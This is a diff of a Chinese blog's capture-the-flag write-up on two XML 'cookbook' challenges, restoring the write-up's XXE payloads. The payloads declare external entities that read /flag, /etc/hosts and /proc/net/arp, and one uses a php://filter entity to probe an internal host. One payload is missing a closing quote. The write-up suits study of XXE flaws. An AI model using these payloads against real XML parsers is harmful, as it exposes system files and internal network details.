@@ -340,7 +340,7 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        307
+                        299
                     </div>
                     
 
@@ -370,34 +370,39 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
 <p>这就比较简单了，毕竟签到题，也没有过滤</p>
 <p>BP抓包（题目关了，如果有复现的话再来放图）</p>
 <p><strong>payload:</strong></p>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="utf-8"?-->
+<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="utf-8"?>
 
+<!DOCTYPE Anything [
 
+<!ENTITY entityex SYSTEM "file:///flag>
 
-]&gt;
+]>
 
-<username>&amp;entityex;</username>
+<username>&entityex;</username>
 </code></pre>
 <h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>这道题跟上道题的代码是一样的，但是<strong>flag</strong>放的位置不一样，比赛的时候没做出来，赛后看了大佬的WP后才知道，这道题考的是找内网真实地址。。</p>
 <p>学习地址  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a> </p>
 <p>payload：</p>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?-->
+<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+ <!ENTITY xxe SYSTEM "file:///etc/hosts">
+ ]>
 
- ]&gt;
-
-<user><username>&amp;xxe;</username><password>123</password></user>
+<user><username>&xxe;</username><password>123</password></user>
 </code></pre>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?-->
+<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+ <!ENTITY xxe SYSTEM "file:///proc/net/arp">
+ ]>
 
- ]&gt;
-
-<user><username>&amp;xxe;</username><password>123</password></user>
+<user><username>&xxe;</username><password>123</password></user>
 </code></pre>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><!--?xml version="1.0" encoding="UTF-8"?-->
+<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://192.168.1.8">
+ ]>
 
- ]&gt;
-
-<user><username>&amp;xxe;</username><password>123</password></user>
+<user><username>&xxe;</username><password>123</password></user>
 </code></pre>
 <h2 id="剩下的等题目复现再写吧，TCL"><a href="#剩下的等题目复现再写吧，TCL" class="headerlink" title="剩下的等题目复现再写吧，TCL"></a>剩下的等题目复现再写吧，TCL</h2><script>
         document.querySelectorAll('.github-emoji')
@@ -637,7 +642,7 @@ int __cdecl main(int argc, const char **argv, const char **envp</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">33.2k</span>
+                <span class="white-color">48k</span>
             
 
             
